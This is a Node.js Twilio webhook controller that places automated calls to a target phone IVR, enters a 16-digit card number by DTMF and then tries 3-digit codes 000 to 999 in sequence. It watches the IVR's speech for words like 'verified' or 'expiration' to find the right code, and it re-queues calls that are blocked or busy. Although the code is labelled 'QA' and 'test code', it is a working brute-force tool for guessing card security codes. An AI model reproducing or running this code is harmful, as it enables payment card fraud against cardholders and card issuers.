import twilio from 'twilio';
import * as AttemptModel from '../models/attemptModel.js';
import * as transcriptionService from '../services/transcriptionService.js';
import { supabase } from '../config/db.js';

// Generate TwiML for when the call is answered (Outbound Automated QA Flow)
export const getTwiML = async (req, res) => {
  const { attemptId } = req.params;
  try {
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('test_value')
      .eq('id', attemptId)
      .single();

    if (fetchErr || !attempt) {
      throw new Error(`Attempt #${attemptId} not found.`);
    }

    const twiml = new twilio.twiml.VoiceResponse();

    let card = attempt.test_value;
    let testCode = '';

    if (attempt.test_value.includes(':')) {
      [card, testCode] = attempt.test_value.split(':');
    }

    if (testCode) {
      // This is a Test code brute force run!
      await AttemptModel.addLog(attemptId, `Call connected. Starting brute force for card: ${card}. Trying first code: ${testCode}...`);

      // Use Twilio's Redirect verb to jump to our loop handler
      const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
      twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${testCode}&isFirst=true`);

    } else {
      // Standard non-Test code test run
      await AttemptModel.addLog(attemptId, `Call connected. Sending DTMF sequence: ${card}`);
      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
      twiml.pause({ length: waitSeconds });
      twiml.play({ digits: `wwww${card}` });

      // Standard wait and hangup
      twiml.pause({ length: 15 });
      twiml.hangup();
    }

    res.type('text/xml');
    return res.send(twiml.toString());
  } catch (error) {
    console.error('Error generating TwiML:', error);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.say('An error occurred during call orchestration.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }
};

// Webhook for handling the continuous TwiML Redirect loop
export const handleTryCode = async (req, res) => {
  const { attemptId } = req.params;
  let { currentTestCode, isFirst } = req.query;

  let currentCodeNum = parseInt(currentTestCode);

  // Safety check for exhausted codes
  if (currentCodeNum > 999) {
    await AttemptModel.addLog(attemptId, `Exhausted all Test codes 001-999. Failed.`);
    await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 Test codes without success' });
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Get base card, target code, status, and winner for checking completion
  const { data: attempt } = await supabase
    .from('attempts')
    .select('test_value, target_test_code, status, result_details')
    .eq('id', attemptId)
    .single();

  let baseCard = '1234567890123456';
  let targetTestCode = null;
  let winnerCode = null;

  if (attempt) {
    if (attempt.test_value) baseCard = attempt.test_value.split(':')[0];
    targetTestCode = attempt.target_test_code;
    if (attempt.result_details && attempt.result_details.winner) {
      winnerCode = attempt.result_details.winner;
    }
  }

  // Check if Twilio's built-in speech recognition returned spoken text from the Target IVR
  const { SpeechResult } = req.body || {};
  if (SpeechResult && SpeechResult.trim() !== '') {
    console.log(`[Twilio Speech Recognition (+18009838472)] Target IVR Spoke: "${SpeechResult}"`);
    await AttemptModel.addLog(attemptId, `[Twilio Live Speech (+18009838472)]: "${SpeechResult}"`);
    
    const existingTranscript = attempt?.result_details?.transcript || '';
    const updatedTranscript = existingTranscript 
      ? `${existingTranscript}\nTarget IVR (+18009838472): ${SpeechResult}` 
      : `Target IVR (+18009838472): ${SpeechResult}`;
      
    await supabase.from('attempts').update({
      result_details: { ...(attempt?.result_details || {}), transcript: updatedTranscript }
    }).eq('id', attemptId);

    // If speech contains victory phrases ("expiration", "expiry", "verified", "test code correct")
    const lowerSpeech = SpeechResult.toLowerCase();
    if (lowerSpeech.includes('expiration') || lowerSpeech.includes('expiry') || lowerSpeech.includes('verified') || lowerSpeech.includes('correct')) {
      await AttemptModel.addLog(attemptId, `🎉 Target IVR speech confirmed winner code ${currentTestCode}! Halting campaign.`);
      await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, {
        ...(attempt?.result_details || {}),
        winner: currentTestCode,
        transcript: updatedTranscript
      });
      OrchestratorService.stopCampaign();
      const twiml = new twilio.twiml.VoiceResponse();
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }
  }

  // If call status is already completed/failed or winner is confirmed, stop immediately!
  const isCompleted = attempt && (attempt.status === 'completed' || attempt.status === 'failed' || winnerCode);
  if (isCompleted) {
    console.log(`[handleTryCode] Attempt #${attemptId} is already ${attempt ? attempt.status : 'finished'} (Winner: ${winnerCode}). Hanging up call immediately.`);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const twiml = new twilio.twiml.VoiceResponse();

  const BATCH_SIZE = parseInt(process.env.BATCH_SIZE) || 1;
  const endCodeNum = Math.min(currentCodeNum + BATCH_SIZE, 1000);

  let lastCodeInBatch = '';
  const batchLogs = [];
  const targetWinner = winnerCode || targetTestCode;
  let reachedWinner = false;

  for (let i = currentCodeNum; i < endCodeNum; i++) {
    const codeStr = i.toString().padStart(3, '0');
    lastCodeInBatch = codeStr;

    const isMatch = targetWinner && codeStr === targetWinner;

    if (i === currentCodeNum && isFirst === 'true') {
      batchLogs.push(`Transmitting 16-digit card number over DTMF: ${baseCard}`);
      batchLogs.push(`Transmitting 3-digit test code over DTMF: ${codeStr}`);
      if (isMatch) {
        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
      } else {
        batchLogs.push(`Call completed for code ${codeStr}. Disconnecting call to dial next code...`);
      }
      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
      twiml.pause({ length: waitSeconds });
      twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
    } else {
      batchLogs.push(`Transmitting 3-digit test code over DTMF: ${codeStr}`);
      if (isMatch) {
        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
      } else {
        batchLogs.push(`Call completed for code ${codeStr}. Disconnecting call to dial next code...`);
      }
      twiml.pause({ length: 2 });
      twiml.play({ digits: codeStr });
    }

    if (isMatch) {
      reachedWinner = true;
      break;
    }
  }

  await AttemptModel.addLogs(attemptId, batchLogs);

  // Determine next code to prepare for next call
  const nextTestCode = (endCodeNum).toString().padStart(3, '0');
  await AttemptModel.updateTestValue(attemptId, `${baseCard}:${nextTestCode}`);

  if (reachedWinner) {
    console.log(`[handleTryCode] Target winner code ${targetWinner} matched. Hanging up call immediately.`);
    twiml.pause({ length: 2 });
    twiml.hangup();
  } else if (BATCH_SIZE === 1) {
    // Single-Code Per Call strategy: disconnect call immediately so next call is placed for next code
    console.log(`[handleTryCode] Code ${lastCodeInBatch} incorrect. Disconnecting call immediately to dial next code.`);
    twiml.pause({ length: 2 });
    twiml.hangup();
  } else {
    twiml.pause({ length: 1 });
    const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
    twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
  }

  res.type('text/xml');
  return res.send(twiml.toString());
};

// Webhook for handling the interactive listen loop (DEPRECATED - Replaced by handleTryCode)
export const handleInteractiveListen = async (req, res) => {
  // Keep this for backwards compatibility if needed, but it is no longer used in the main flow
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.hangup();
  res.type('text/xml');
  return res.send(twiml.toString());
};

// Webhook exclusively for Twilio Studio Flow outcomes (using CallSid)
export const handleStudioWebhook = async (req, res) => {
  const { CallSid, flow_status } = req.body;
  try {
    if (!CallSid || !flow_status) {
      return res.status(400).send('Missing CallSid or flow_status');
    }

    // Find the exact attempt matching this CallSid
    const { data: attempt } = await supabase.from('attempts').select('id, test_value').eq('call_sid', CallSid).single();
    if (!attempt) {
      console.warn(`[Studio Webhook] Received webhook for unknown CallSid: ${CallSid}`);
      return res.status(404).send('Unknown CallSid');
    }

    const attemptId = attempt.id;
    await AttemptModel.addLog(attemptId, `Studio Flow Webhook: ${flow_status}`);
    
    if (flow_status === 'success_correct_code') {
      let winnerCode = '';
      if (attempt.test_value && attempt.test_value.includes(':')) {
         winnerCode = attempt.test_value.split(':')[1];
      }
      await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, { winner: winnerCode });
    } else if (flow_status === 'failed_invalid_card') {
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Studio Flow rejected the 16-digit card number' });
      await AttemptModel.addLog(attemptId, `❌ 16-digit card number rejected by Target IVR. Halting campaign.`);
      OrchestratorService.stopCampaign();
    }
    
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling studio webhook:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for tracking call status updates from Twilio
export const handleStatusCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { CallStatus, CallDuration } = req.body;
  try {
    if (CallStatus) {
      await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);

      if (CallStatus === 'completed') {
        const duration = parseInt(CallDuration) || 0;

        const { data: attempt } = await supabase
          .from('attempts')
          .select('batch_id, target_phone_number, test_value, target_test_code, result_details, status')
          .eq('id', attemptId)
          .single();
          
        const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;

        if (foundWinner) {
          await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
          await AttemptModel.addLog(attemptId, `🎉 Winner confirmed on Attempt #${attemptId}! Halting campaign.`);
          OrchestratorService.stopCampaign();
        } else {
          await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { twilioStatus: CallStatus, error: 'Incorrect test code' });
          await AttemptModel.addLog(attemptId, `Attempt #${attemptId} completed. Line freed for next attempt.`);

          // Dynamically queue ONLY the 1 next attempt row for the next code!
          if (attempt && attempt.test_value && attempt.test_value.includes(':')) {
            const parts = attempt.test_value.split(':');
            const baseCard = parts[0];
            const currentCodeNum = parseInt(parts[1], 10);
            const nextCodeNum = currentCodeNum + 1;

            if (nextCodeNum <= 999) {
              const nextCodeStr = nextCodeNum.toString().padStart(3, '0');
              const nextTarget = [{
                phone_number: attempt.target_phone_number || '+18009838472',
                test_value: `${baseCard}:${nextCodeStr}`,
                target_test_code: attempt.target_test_code
              }];
              await AttemptModel.createAttemptBatch(nextTarget, attempt.batch_id);
              await AttemptModel.addLog(attemptId, `Dynamically queued 1 new attempt for code ${nextCodeStr}.`);
            }
          }
        }
      } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
        const duration = parseInt(CallDuration) || 0;
        await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
        await AttemptModel.addLog(attemptId, `Attempt #${attemptId} encountered ${CallStatus}. Line freed for next attempt.`);

        // Re-queue 1 single attempt for the same code if call was blocked/busy
        const { data: attempt } = await supabase.from('attempts').select('batch_id, target_phone_number, test_value, target_test_code').eq('id', attemptId).single();
        if (attempt && attempt.test_value) {
          await AttemptModel.createAttemptBatch([{
            phone_number: attempt.target_phone_number || '+18009838472',
            test_value: attempt.test_value,
            target_test_code: attempt.target_test_code
          }], attempt.batch_id);
        }
      }
    }

    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling status callback:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for handling recording callbacks
export const handleRecordingCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { RecordingUrl, RecordingStatus } = req.body;
  try {
    if (RecordingUrl) {
      const { data: attempt } = await supabase
        .from('attempts')
        .select('status, result_details')
        .eq('id', attemptId)
        .single();
        
      const isFinished = attempt && (attempt.status === 'completed' || attempt.status === 'failed' || (attempt.result_details && attempt.result_details.winner));

      if (isFinished) {
        await AttemptModel.addLog(attemptId, `Final call recording received: ${RecordingUrl}`);
        // Process recording & final transcript when the campaign finishes at the end!
        transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
          console.error(`Error transcribing final recording for attempt #${attemptId}:`, err);
        });
      } else {
        // Quietly store recording URL on intermediate attempts without heavy download/transcription logging
        await supabase.from('attempts').update({
          result_details: { ...(attempt?.result_details || {}), recording_url: RecordingUrl }
        }).eq('id', attemptId);
      }
    }
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling recording callback:', error);
    return res.status(500).send('Error');
  }
};
